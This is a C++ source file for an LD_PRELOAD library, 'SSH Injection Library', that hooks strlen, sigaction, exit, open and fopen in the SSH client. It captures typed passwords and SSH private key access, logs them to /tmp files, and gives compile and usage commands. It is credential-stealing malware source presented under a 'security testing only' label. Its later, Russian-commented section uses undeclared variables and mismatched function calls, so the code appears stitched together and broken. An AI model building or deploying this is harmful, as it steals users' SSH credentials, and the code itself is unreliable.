/**
 * SSH Injection Library
 * 
 * This library intercepts and monitors SSH authentication process by hooking into
 * key system calls. It captures SSH passwords by tracking the state machine
 * of the SSH client process.
 * 
 * Intercepted functions:
 * - strlen: Monitors password input
 * - sigaction: Detects SIGTTOU signals
 * - exit: Ensures proper cleanup
 * - open/fopen: Monitors SSH key access (added)
 * 
 * All events are logged to /tmp/ssh_inj.dbg
 * SSH keys are logged to /tmp/ssh_keys.log
 * 
 * Usage:
 * 1. Compile: g++ -shared -fPIC -o libssh_inject.so ssh_inject.cpp -ldl
 * 2. Use: LD_PRELOAD=./libssh_inject.so ssh user@server
 * 
 * For Linux systems only!
 * For security testing purposes only!
 */

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <exception>
#include <pwd.h>
#define LIB_VERSION "1.1.0"

#include "state.hpp"
#include "key_interceptor.hpp"

// Global client state manager
ClientAuthSpy auth_spy;

// Original libc function pointers
typedef size_t (*strlen_t)(const char *);
typedef int (*sigaction_t)(int, const struct sigaction *, struct sigaction *);
typedef void (*exit_t)(int);

// Storage for original functions
static strlen_t orig_strlen = NULL;
static sigaction_t orig_sigaction = NULL;
static exit_t orig_exit = NULL;

// Get command line for a PID
const char* get_cmdline_static(pid_t pid) {
    static char cmdline[1024] = {0};
    char path[64];
    
    snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
    
    FILE* f = fopen(path, "r");
    if (!f) {
        return "unknown";
    }
    
    size_t n = fread(cmdline, 1, sizeof(cmdline) - 1, f);
    fclose(f);
    
    if (n <= 0) {
        return "unknown";
    }
    
    // Replace nulls with spaces for readability
    for (size_t i = 0; i < n - 1; i++) {
        if (cmdline[i] == '\0') {
            cmdline[i] = ' ';
        }
    }
    
    cmdline[n] = '\0';
    return cmdline;
}

// Get username for current process
const char* get_username_static() {
    static char username[256] = {0};
    
    // Try from environment first
    const char* user = getenv("USER");
    if (user) {
        strncpy(username, user, sizeof(username) - 1);
        return username;
    }
    
    // Otherwise get from UID
    struct passwd* pw = getpwuid(getuid());
    if (pw && pw->pw_name) {
        strncpy(username, pw->pw_name, sizeof(username) - 1);
        return username;
    }
    
    return "unknown";
}

// Override strlen to intercept password
extern "C" size_t strlen(const char *s) {
    if (!orig_strlen) {
        orig_strlen = (strlen_t)dlsym(RTLD_NEXT, "strlen");
        if (!orig_strlen) {
            // Fallback to libc directly if symbol not found
            void* handle = dlopen("libc.so.6", RTLD_LAZY);
            if (handle) {
                orig_strlen = (strlen_t)dlsym(handle, "strlen");
                dlclose(handle);
            }
            
            if (!orig_strlen) {
                // If we still can't find it, use a basic implementation
                const char* p = s;
                while (*p) p++;
                return p - s;
            }
        }
    }
    
    size_t len = orig_strlen(s);
    
    // Let the state manager analyze the string
    auth_spy.analyze(s);
    
    return len;
}

// Override sigaction to track SSH process lifetime
extern "C" int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact) {
    if (!orig_sigaction) {
        orig_sigaction = (sigaction_t)dlsym(RTLD_NEXT, "sigaction");
        if (!orig_sigaction) {
            void* handle = dlopen("libc.so.6", RTLD_LAZY);
            if (handle) {
                orig_sigaction = (sigaction_t)dlsym(handle, "sigaction");
                dlclose(handle);
            }
        }
    }
    
    return orig_sigaction ? orig_sigaction(signum, act, oldact) : -1;
}

// Override exit to capture end of process
extern "C" void exit(int status) {
    if (!orig_exit) {
        orig_exit = (exit_t)dlsym(RTLD_NEXT, "exit");
        if (!orig_exit) {
            void* handle = dlopen("libc.so.6", RTLD_LAZY);
            if (handle) {
                orig_exit = (exit_t)dlsym(handle, "exit");
                dlclose(handle);
            }
        }
    }
    
    if (auth_spy.has_state()) {
        // Only log if in auth state and exiting
        auth_spy.log_action("process_exit", get_username_static(), get_cmdline_static(getpid()));
    }
    
    orig_exit ? orig_exit(status) : _exit(status);
}

// Constructor - called when library is loaded
__attribute__((constructor))
static void init(void) {
    // Initialize interception
    auth_spy.log_action("lib_loaded", get_username_static(), get_cmdline_static(getpid()));
}

// Destructor - called when library is unloaded
__attribute__((destructor))
static void fini(void) {
    // Clean up resources
    auth_spy.log_action("lib_unloaded", get_username_static(), get_cmdline_static(getpid()));
}

extern "C" {

// Перехват open
int open(const char *pathname, int flags, ...) {
    // Ленивая загрузка real_open
    if (!real_open) {
        void* handle = dlopen("libc.so.6", RTLD_LAZY);
        if (!handle) {
            fprintf(stderr, "Failed to load libc: %s\n", dlerror());
            abort();
        }
        real_open = (int(*)(const char*, int, ...))dlsym(handle, "open");
        if (!real_open) {
            fprintf(stderr, "Failed to get real_open: %s\n", dlerror());
            abort();
        }
        
        // Инициализируем модули, если не были инициализированы
        if (!g_spy) {
            ProcessInfo pi = {
                get_cmdline_static(),
                get_username_static()
            };
            g_spy = new ClientAuthSpy(pi);
            g_spy->Initiated();
        }
    }
    
    // Получаем переменный аргумент mode
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }
    
    // Вызываем реальную функцию open
    int fd;
    if (flags & O_CREAT) {
        fd = real_open(pathname, flags, mode);
    } else {
        fd = real_open(pathname, flags);
    }
    
    // Если файл успешно открыт и это файл для чтения, проверяем на SSH-ключ
    if (fd >= 0 && pathname && (flags & O_RDONLY || flags & O_RDWR)) {
        key_interceptor->FileOpened(pathname, fd);
    }
    
    return fd;
}

// Перехват fopen
FILE* fopen(const char *pathname, const char *mode) {
    // Ленивая загрузка real_fopen
    if (!real_fopen) {
        void* handle = dlopen("libc.so.6", RTLD_LAZY);
        if (!handle) {
            fprintf(stderr, "Failed to load libc: %s\n", dlerror());
            abort();
        }
        real_fopen = (FILE*(*)(const char*, const char*))dlsym(handle, "fopen");
        if (!real_fopen) {
            fprintf(stderr, "Failed to get real_fopen: %s\n", dlerror());
            abort();
        }
        
        // Инициализируем модули, если не были инициализированы
        if (!g_spy) {
            ProcessInfo pi = {
                get_cmdline_static(),
                get_username_static()
            };
            g_spy = new ClientAuthSpy(pi);
            g_spy->Initiated();
        }
    }
    
    // Вызываем реальную функцию fopen
    FILE* file = real_fopen(pathname, mode);
    
    // Если файл успешно открыт и это файл для чтения, проверяем на SSH-ключ
    if (file && pathname && (strchr(mode, 'r') != NULL)) {
        key_interceptor->FileOpened(pathname, file);
    }
    
    return file;
}

} // extern "C" 